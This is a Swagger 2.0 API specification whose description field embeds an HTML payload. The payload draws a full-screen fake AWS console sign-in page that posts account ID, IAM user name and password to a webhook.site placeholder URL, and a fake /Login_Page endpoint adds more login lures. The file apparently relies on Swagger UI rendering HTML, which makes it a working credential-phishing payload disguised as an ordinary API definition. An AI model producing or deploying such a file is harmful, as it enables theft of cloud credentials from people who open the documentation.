swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#232f3e;z-index:99998;font-family:Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:0;left:0;width:100%;background:#232f3e;color:#fff;padding:14px 28px;font-family:Arial;z-index:99999;"><span style="font-size:20px;font-weight:700;color:#ff9900;">aws</span> <span style="font-size:15px;">| API Management Console</span></div><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:380px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:28px 28px 22px;"><div style="font-size:20px;color:#16191f;font-weight:600;">Sign in</div><div style="font-size:13px;color:#545b64;margin:6px 0 16px;">IAM user name</div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="account" value="" placeholder="Account ID (12 digits)" style="width:100%;padding:9px;border:1px solid #7d8998;border-radius:3px;box-sizing:border-box;margin-bottom:12px;font-size:14px;"><input type="text" name="user" placeholder="IAM user name" style="width:100%;padding:9px;border:1px solid #7d8998;border-radius:3px;box-sizing:border-box;margin-bottom:12px;font-size:14px;"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:9px;border:1px solid #7d8998;border-radius:3px;box-sizing:border-box;margin-bottom:14px;font-size:14px;"><div style="display:flex;justify-content:space-between;align-items:center;"><span style="font-size:12px;color:#0073bb;">Forgot password?</span><button type="submit" style="padding:9px 30px;background:#ff9900;color:#232f3e;border:1px solid #ff9900;border-radius:3px;font-size:14px;font-weight:600;cursor:pointer;">Sign in</button></div></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
